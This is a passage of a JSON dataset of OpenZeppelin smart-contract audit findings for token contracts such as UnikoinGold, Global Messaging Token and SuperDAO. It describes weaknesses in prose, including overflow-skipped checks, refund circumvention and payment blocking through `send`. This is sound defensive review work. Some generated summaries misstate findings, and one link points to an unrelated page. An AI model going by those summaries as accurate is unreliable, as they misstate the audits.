once the final code is frozen.*\n\n\n* Consider emitting [Transfer events from the 0x0 address](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer) when creating new tokens, instead of (or additionally to) emitting custom [CreateUKGEvent](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/65e2f6a461aee01ef23d2a99abc9b0ca00be5a7d/contracts/TokenDistribution.sol#L58) events in the `TokenDistribution` constructor [L137](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L137) and [L139](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L139).\n\n\n**Update**: *Fixed in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/c697baef1c862c8068e00a76125694707b57dd21) commit.*\n\n\nConsider making these changes to make the token respect the ERC20 standard.",
      "summary": "\nThe UKG token is not ERC20 compliant due to several issues. The `totalSupply` variable was not updating correctly, so it was not reflecting the total token supply. This was fixed in a commit. Additionally, public `name`, `symbol`, and `decimal` properties were not present, which are recommended in the ERC20 specification. This was also fixed in two commits. Finally, Transfer events were not being emitted from the 0x0 address, which was fixed in another commit. These changes were made to ensure that the token respects the ERC20 standard.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11965",
      "title": "Check order of timestamps in Token distribution constructor",
      "impact": "HIGH",
      "content": "The TokenDistribution contract relies on [three timestamps](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L58-L60):\n\n\n* `freezeTimestamp`, which indicates up to which point it is possible to cancel the distribution contract\n* `distributionStartTimestamp`, that signals when the distribution starts\n* `lockupTimestamp`, which indicates when locked tokens may be released\n\n\nThough it is assumed that `freezeTimestamp` should be before the `distributionStartTimestamp`, this is not checked in the code. If this precondition is not respected, an owner may stop the contract mid-distribution.\n\n\nAlso, for the lockup to have any effect, it is necessary for `lockupTimestamp` to occur after the `distributionStartTimestamp`. Otherwise, locked tokens can be claimed as soon as distribution starts.\n\n\nConsider adding a `require` guard for `freezeTimestamp &lt; distributionStartTimestamp`, and another for `distributionStartTimestamp &lt; lockupTimestamp`, in the TokenDistribution [constructor](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L121).\n\n\n**Update**: *First guard added in [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/604041772ea42e5993383b164a9afc884fd18a4f) commit. Second one is unnecessary as per [this](https://github.com/unikoingold/UnikoinGold-UKG-Contract/commit/5853f960da0ae2dc58a2c3e1f179e47c6a467c1f) commit.*",
      "summary": "\nThe TokenDistribution contract is used to manage token distributions. It relies on three timestamps - 'freezeTimestamp', 'distributionStartTimestamp' and 'lockupTimestamp' - to determine when the distribution can be cancelled, when the distribution starts and when locked tokens may be released, respectively.\n\nHowever, the contract does not check if 'freezeTimestamp' is before 'distributionStartTimestamp'. If this precondition is not respected, an owner may be able to stop the contract mid-distribution. Additionally, 'lockupTimestamp' must occur after 'distributionStartTimestamp' for the lockup to have any effect; otherwise, locked tokens can be claimed as soon as distribution starts.\n\nTo address this issue, it is suggested to add a 'require' guard for 'freezeTimestamp < distributionStartTimestamp' and another for 'distributionStartTimestamp < lockupTimestamp' in the TokenDistribution constructor. This has since been implemented, and the second guard is unnecessary.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11964",
      "title": "Unnecessary claim step for sale contributors",
      "impact": "HIGH",
      "content": "Contributors participate in the sale by transferring their balance to a set of trusted addresses managed by Unikrn, who then distribute the tokens in a later step via the `TokenDistribution` contract. Token allocations are set for each contributor, who must then [claim](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L148) the tokens to have them added to their balance.\n\n\nThe [documentation](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/README.md#participant-claim) indicates that this is done “because if a participant were to lose their key, there would never be 1B tokens created”. This is incorrect, since tokens can still be created and allocated to their addresses. This way, there will be indeed 1B tokens, even if some participants cannot move them afterwards.\n\n\nFurthermore, if a participant did misplace their keys, tokens are locked in the TokenDistribution contract (as per [L136](https://github.com/unikoingold/UnikoinGold-UKG-Contract/blob/8b38f30039c2d13383c416fd6143f6bd0f091404/contracts/TokenDistribution.sol#L136)) and there are not methods to take them out of the contract, so the tokens are created but are unusable. A participant may misplace their keys after the distribution, so it makes no sense to try to prevent allocation to addresses with lost keys.\n\n\nConsider removing the claim mechanic altogether, and allocate the tokens to the contributors directly. The whole `ParticipantAdditionProxy` contract seems to be unnecessary. This reduces the complexity of the distribution process, simplifies the code, and reduces the hassle for end users to access their purchased tokens.\n\n\n**Update:** *The CoinCircle team indicated that this was motivated by the fact that the proxy contract will be deployed before the distribution contract, in order to store the future owners of the token before the final implementation is finalized:*\n\n\n\n> \n>  The design decision for the contract was to separate concerns: the proxy contract will be deployed prior to the distribution contract. The proxy contract will be populated by Unikrn, and not be made known to the public until the contract is verified, locked and unchangeable\n> \n> \n>",
      "summary": "\nThis bug report is about the token distribution process of Unikrn, a platform that allows contributors to participate in a sale by transferring their balance to a set of trusted addresses. The documentation states that the token allocations are set for each contributor, who must then claim the tokens to have them added to their balance in order to prevent 1B tokens from being created. However, this is incorrect because tokens can still be created and allocated to their addresses, resulting in 1B tokens even if some participants can’t move them afterwards. Furthermore, tokens are locked in the TokenDistribution contract and there are no methods to take them out, making them unusable.\n\nTo fix this issue, it is suggested to remove the claim mechanic altogether and allocate the tokens to the contributors directly. This will reduce the complexity of the distribution process, simplify the code, and reduce the hassle for end users. The CoinCircle team indicated that this was motivated by the fact that the proxy contract will be deployed before the distribution contract, in order to store the future owners of the token before the final implementation is finalized.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "UnikoinGold Token Audit",
      "source_link": "https://blog.openzeppelin.com/unikoingold-token-audit-aafb7de07f3/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11991",
      "title": "No Transfer event for minted tokens",
      "impact": "LOW",
      "content": "It is recommended, [in the ERC20 spec](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md#transfer), to emit a `Transfer` event with the source (`_from`) set to `0x0` when minting new tokens. This enhances user experience by allowing applications such as [Etherscan](https://etherscan.io/) to learn of the new token holders. In this case this is only relevant for the constructor, where the initial balance is assigned to the contract creator. Nonetheless, consider emitting the corresponding event: `Transfer(0x0, msg.sender, _initialAmount)`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Everus Token Audit",
      "source_link": "https://blog.openzeppelin.com/everus-token-audit-a05f0959534e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11990",
      "title": "Unnecessary low level call",
      "impact": "LOW",
      "content": "The implementation of `approveAndCall` is using a low level `call` to invoke a function on another contract. A comment explains this is *“so one doesn’t have to include a contract in here just for this”*. We would actually strongly recommend including the extra contract, and replacing the usage of `call` for a Solidity function call. Manually crafting the function signature is highly error prone, and on top of that, the arguments are not typechecked. Consider adding an abstract contract with the `receiveApproval` function declared, and using it to implement `approveAndCall`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Everus Token Audit",
      "source_link": "https://blog.openzeppelin.com/everus-token-audit-a05f0959534e/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12005",
      "title": "Duplicate decimals value",
      "impact": "LOW",
      "content": "The `decimals` parameter used to calculate token amounts is duplicated in the [`GMToken`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L18) and [`GMTSafe`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Safe/GMTSafe.sol#L17) contracts. This redundancy is error-prone, as the two variables could get out of sync if they are changed at any moment. Consider leaving only the `decimals` variable defined in `GMToken`. The `GMTSafe` contract can store the [token grain amount](https://twitter.com/maraoz/status/900411044463378432) to be transferred, instead of the token unit amount (e.g. `4*10¹⁸ vs 4`).\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12004",
      "title": "ERC20 compliance",
      "impact": "LOW",
      "content": "ERC20 specifies `decimals` to be a value of type `uint8`. It is [declared](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L18) as a `uint256` variable in `GMToken`. Consider changing it to `uint8`. If so, it will be necessary to cast to `uint256` when using the variable for arithmetic such as when expressing token amounts like in [`500 * (10**6) * 10**decimals`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L43). Consider defining a constant `uint256 TOKEN_UNIT = 10 ** uint256(decimals)` to write `500e6 * TOKEN_UNIT` in these cases.\n\n\nA `Transfer` event is emitted next to `ClaimGMT` in the constructor, and there is a spot on comment with an explanation. We would add to it that emitting a `Transfer` event when creating tokens enhances user experience by allowing applications such as [Etherscan](https://etherscan.io/) to learn of the new token holders. A similar `Transfer` event is missing [next to](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L155) [`ClaimGMT`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L155) in `claimTokens`. Consider adding it: `Transfer(0x0, msg.sender, tokens)`.\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12003",
      "title": "Unsafe math",
      "impact": "LOW",
      "content": "There are many unchecked arithmetic operations in `GMToken` and `StandardToken`. It’s always better to be safe and perform checked operations. Consider using the [`SafeMath`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/dfe4914c6856b06e3f02475cd6ee834855fc9726/contracts/Utils/SafeMath.sol) library, or performing pre-condition checks on any math operation.\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12002",
      "title": "Reuse open source contracts",
      "impact": "LOW",
      "content": "The contracts [`StandardToken`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/StandardToken.sol), [`GMToken`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol) and [`SafeMath`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Utils/SafeMath.sol) are very similar to code found in [OpenZeppelin](https://openzeppelin.org/)’s [`StandardToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/token/StandardToken.sol), [`Crowdsale`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/token/StandardToken.sol), [RefundableCrowdsale](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/crowdsale/Crowdsale.sol) and [`SafeMath`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/v1.3.0/contracts/math/SafeMath.sol) contracts. Reimplementing functionality instead of reusing public and already audited code can bring [regression problems and difficult to find bugs](https://blog.zeppelin.solutions/hackergold-bug-analysis-68d893cad738). Consider installing and using the code available in [OpenZeppelin](https://openzeppelin.org/).\n\n\n***Update:** The team has pointed out that the token is in fact taken from [ConsenSys](https://github.com/ConsenSys/Tokens/tree/bb15a1f0140d8f388a59fd77b444c7ac65f06c55).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12001",
      "title": "Constructor parameter sanity checks",
      "impact": "LOW",
      "content": "Consider performing sanity checks to validate `GMToken`’s [constructor parameters](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L99-L102). Check that `_startBlock &lt; _endBlock`.\n\n\n***Update:** Fixed in the latest version.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12000",
      "title": "Using block numbers to specify start and end",
      "impact": "LOW",
      "content": "The sale uses block numbers to specify [when it starts and when it ends](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L40-L41). The current recommendation is to use timestamps instead. The risk of miner manipulation of timestamps is very low for this use case, and due to the [Difficulty Bomb](https://etherscan.io/chart/blocktime) it is now very difficult to correctly estimate future block times. Consider switching to timestamps.\n\n\n***Update:** The team has decided to keep using block numbers.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11999",
      "title": "Arbitrary and redundant stage state variable",
      "impact": "MEDIUM",
      "content": "The functions [`startSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L125), [`stopSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L131) and [`setFailedState`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L137) allow the owner to set the [`stage`](http://tampermonkey.net/changelog.php?version=4.5.5570&ext=fire&updated=true&old=4.5.5564&intr=true) state variable. However, there are no restrictions on when they can be called, and consequently the value of the `stage` variable isn’t necessarily the *actual* stage of the sale. As an example, in the middle of the sale the owner can call `setFailedState`, without it having really failed.\n\n\nThe variable actually serves no purpose other than giving the owner some control over when its functions can be called. This control is limited, however, because there are already other restrictions in place. For example, `refund` can only be called [after the sale period](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L201) and [if the minimum cap isn’t reached](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L202). This makes us think the `stage` variable is redundant.\n\n\nWe would recommend to remove it along with the setter functions, to further trust minimization and remove the possible inconsistent states. Alternatively, add checks to `stage` setter functions, and only rely on those for other function preconditions.\n\n\n***Update:** The variable was removed in the latest version.*",
      "summary": "\nThis bug report is about the functions [`startSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L125), [`stopSale`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L131) and [`setFailedState`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L137) which allow the owner to set the [`stage`](http://tampermonkey.net/changelog.php?version=4.5.5570&ext=fire&updated=true&old=4.5.5564&intr=true) state variable. This variable is redundant, as there are already other restrictions in place that limit when certain functions can be called. For example, `refund` can only be called after the sale period and if the minimum cap isn’t reached. The bug report recommends removing the variable and the setter functions for trust minimization, or adding checks to the setter functions so that they are the only ones relied on for other function preconditions. The variable has since been removed in the latest version.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11998",
      "title": "Team can circumvent refund restriction",
      "impact": "HIGH",
      "content": "The [`refund`](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L201) function allows investors to ask for a refund if the minimum cap is not reached. Radical App International is given a share of tokens [at the beginning of the process](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L115) for which they should not be entitled to a refund. This is accounted for by [not allowing their address](https://github.com/MercuryProtocol/global-messaging-token-contracts/blob/d0765cbd0732453832455dae0e2cf892da1ab572/contracts/Tokens/GMToken.sol#L203) to call `refund`. Since tokens are always transferable, they could easily circumvent this by transferring the tokens to another address and calling `refund` from it.\n\n\nConsider disallowing transfers until the crowdsale ends successfully, for example by using [OpenZeppelin’s `PausableToken`](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/token/PausableToken.sol) or something similar. Not only will it fix this bug, but it’s also common practice.\n\n\nAlternatively, consider giving Radical App International its share of tokens at the successful finalization of the crowdsale.\n\n\n***Update:** Fixed with the alternative suggestion in the latest version.*",
      "summary": "\nThis bug report is about the `refund` function in the Global Messaging Token Contracts. This function allows investors to ask for a refund if the minimum cap is not reached. Radical App International is given a share of tokens at the beginning of the process, for which they should not be entitled to a refund. To account for this, the code does not allow their address to call `refund`. However, since tokens are always transferable, they could easily circumvent this by transferring the tokens to another address and calling `refund` from it.\n\nThe bug was fixed with the alternative suggestion in the latest version. Two solutions were suggested to prevent Radical App International from getting a refund: disallowing transfers until the crowdsale ends successfully, for example by using OpenZeppelin’s `PausableToken`; or giving Radical App International its share of tokens at the successful finalization of the crowdsale.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Global Messaging Token Audit",
      "source_link": "https://blog.openzeppelin.com/global-messaging-token-audit-865e6a821cd8/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12156",
      "title": "Avoid name reuse",
      "impact": "LOW",
      "content": "The `constructor` and `founderSwitchRequest` function in PromissoryToken.sol use the name `_founderHash`, for two different semantic meanings. Using the same name for two different things is confusing and can bring unintended behaviors. Consider changing the function parameter name to `founderPassword` to differenciate it’s specific meaning.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12155",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol) and setting a period of time where security researchers from around the globe can try to break the token’s invariants. For more info on how to implement automated bug bounties with OpenZeppelin, [see this guide](https://github.com/OpenZeppelin/zeppelin-solidity#add-your-own-bounty-contract).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12154",
      "title": "Usage of magic constants",
      "impact": "LOW",
      "content": "There are several [magic constants](https://en.wikipedia.org/wiki/Magic_number_%28programming%29) in the contract code. Some examples are:\n\n\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L219>\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L276>\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/ConstitutionalDNA.sol#L233>\n* <https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/ConstitutionalDNA.sol#L228>\n\n\nUse of magic constants reduces code readability and makes it harder to understand code intention. We recommend extracting magic constants into contract constants.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12153",
      "title": "Use latest version of Solidity",
      "impact": "MEDIUM",
      "content": "[Current code](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L1) is written for old versions of solc (0.4.0). With [the latest storage overwriting vulnerability](https://blog.ethereum.org/2016/11/01/security-alert-solidity-variables-can-overwritten-storage/) found on versions of solc prior to 0.4.4, there’s a risk this code can be compiled with vulnerable versions. We recommend changing the solidity version pragma for the latest version (`pragma solidity ^0.4.7;`) to enforce latest compiler version to be used.",
      "summary": "\nThis bug report is about an issue with the code in the Superdao-Seed-Stage1 repository. The code was written using an old version of the Solidity compiler (0.4.0) and is at risk of being compiled with a vulnerable version of the compiler due to the latest storage overwriting vulnerability. To address this, it is recommended that the Solidity version pragma be changed to the latest version (^0.4.7) to ensure that only the latest compiler version is used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12152",
      "title": "Use safe math",
      "impact": "MEDIUM",
      "content": "There are many unchecked math operations in the code. It’s always better to be safe and perform checked operations. Consider [using a safe math library](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/SafeMath.sol#L6), or performing pre-condition checks on any math operation.\n\n\nA particular attack on the PromissoryToken contract can be done by the founder when calling the function `setPrepaid`. [On line 161 of PromissoryToken.sol](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L161), the check can be skipped if a big enough `_tokenAmount` is chosen by the founder.",
      "summary": "\nThis bug report is about unchecked math operations in the PromissoryToken contract code. It is recommended to use a safe math library or perform pre-condition checks on any math operation to prevent attacks from occurring. Specifically, on line 161 of the PromissoryToken.sol, a check can be skipped if a large enough token amount is chosen by the founder. To avoid this, it is important to use a safe math library or perform pre-condition checks on any math operation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12151",
      "title": "Use of send",
      "impact": "HIGH",
      "content": "Use of `send` is always risky and should be analyzed in detail. One occurrence found in [line 291 of PromissoryToken.sol](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L291).  \n\n– [Always check send return value](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#c528): OK.  \n\n– [Consider calling send at the end of the function](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#3d17): OK.  \n\n– [Favor pull payments over push payments](https://medium.com/zeppelin-blog/onward-with-ethereum-smart-contract-security-97a827e47702#fa61): Severe problem.\n\n\nIf there is more than one destination in a withdrawal proposal, one of the destination addresses can prevent all others from getting the funds. If one of the destination addresses throws in the fallback function, the whole `approveWithdraw`function call will fail, causing all payments to fail. This gives control to any malicious payee to block payments to all other payees.\n\n\nFor more info on this problem, [see this note](https://github.com/ConsenSys/Ethereum-Development-Best-Practices/wiki/Fallback-functions-and-the-fundamental-limitations-of-using-send%28%29-in-Ethereum-&-Solidity#abuse).",
      "summary": "\nThe bug report is about the use of the `send` function in the PromissoryToken.sol contract. When there is more than one destination in a withdrawal proposal, one of the destination addresses can prevent all others from getting the funds. If one of the destination addresses throws in the fallback function, the whole `approveWithdraw`function call will fail, causing all payments to fail. This gives control to any malicious payee to block payments to all other payees.\n\nThe report states that the use of `send` is always risky and should be analyzed in detail. It recommends that the return value of the `send` function should always be checked, that the `send` function should be called at the end of the function, and that pull payments should be favored over push payments.\n\nThe bug report is important because it highlights the risks of using the `send` function and provides recommendations on how to mitigate these risks. It is important for beginners to be aware of the potential security risks associated with the `send` function and to follow best practices when using it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12150",
      "title": "Use of passwords as function authentication mechanisms",
      "impact": "HIGH",
      "content": "The use of `founderHash`, `privatePhrase` and `_oneTimesharedPhrase` as an authentication mechanism does not add any security. Even non-public variables can be read by anyone from the blockchain, and anyone can check transaction data to recover parameter values. Checks using `founderHash`, `privatePhrase` and `_oneTimesharedPhrase` are useless and can thus be removed with an equivalent result.\n\n\nConsider switching to `msg.sender`-based authentication as used [here](https://github.com/Superdao-DAO/Superdao-Seed-Stage1/blob/c20d6d45d911f59003122d97df701848cf597cab/contracts/PromissoryToken.sol#L101).",
      "summary": "\nThis bug report is about an authentication mechanism used in a blockchain. It states that the use of `founderHash`, `privatePhrase` and `_oneTimesharedPhrase` as an authentication mechanism does not add any security. This is because these variables can be read by anyone from the blockchain, and anyone can check the transaction data to recover the parameter values. Therefore, the checks using these variables are useless and can be removed with an equivalent result.\n\nThe bug report suggests switching to `msg.sender`-based authentication as used in a certain github repository. This authentication mechanism is based on the sender of a message, which is more secure than the existing one.\n\nOverall, this bug report is about an authentication mechanism used in a blockchain that is not secure. It suggests switching to `msg.sender`-based authentication as an alternative, which is more secure.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "SuperDAO Promissory Token audit",
      "source_link": "https://blog.openzeppelin.com/draft-superdao-promissory-token-audit-2409e0fe776c/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "12178",
      "title": "Bug Bounty",
      "impact": "LOW",
      "content": "Formal security audits are not enough to be safe. We recommend implementing [an automated contract-based bug bounty](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/Bounty.sol) and setting a period of time where security researchers from around the globe can try to break the token’s invariants. For more info on how to implement automated bug bounties with OpenZeppelin, [see this guide](https://github.com/OpenZeppelin/zeppelin-solidity#add-your-own-bounty-contract).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
